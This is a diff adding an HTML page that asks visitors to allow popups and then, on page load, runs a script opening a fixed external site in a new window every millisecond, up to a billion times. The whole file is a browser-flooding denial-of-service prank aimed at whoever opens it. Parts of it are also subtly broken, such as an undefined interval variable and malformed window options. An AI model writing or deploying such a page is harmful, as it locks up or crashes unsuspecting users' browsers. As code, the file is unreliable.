@@ -1,1 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  You need to allow popups and redirects for this to work
+  <title>Enable Popups and redirects</title>
+</head>
+<body>
 
+  <script>
+    function openNewTab() {
+      var count = 0;
+      setInterval(function() {
+        count++;
+        window.open("https://barth-site.vercel.app", "_blank", "width=math.random(),height=400,scrollbars=yes")
+        if (count > 1000000000) {
+          clearInterval(intervalId); // Stop after opening 1000000000
+        }
+      }, 1); // Open a tab every milisecond (will probably lag though and open slower)
+      
+    }
+
+    // Call the function to start opening tabs
+    openNewTab();
+  </script>
+
+</body>
+</html>
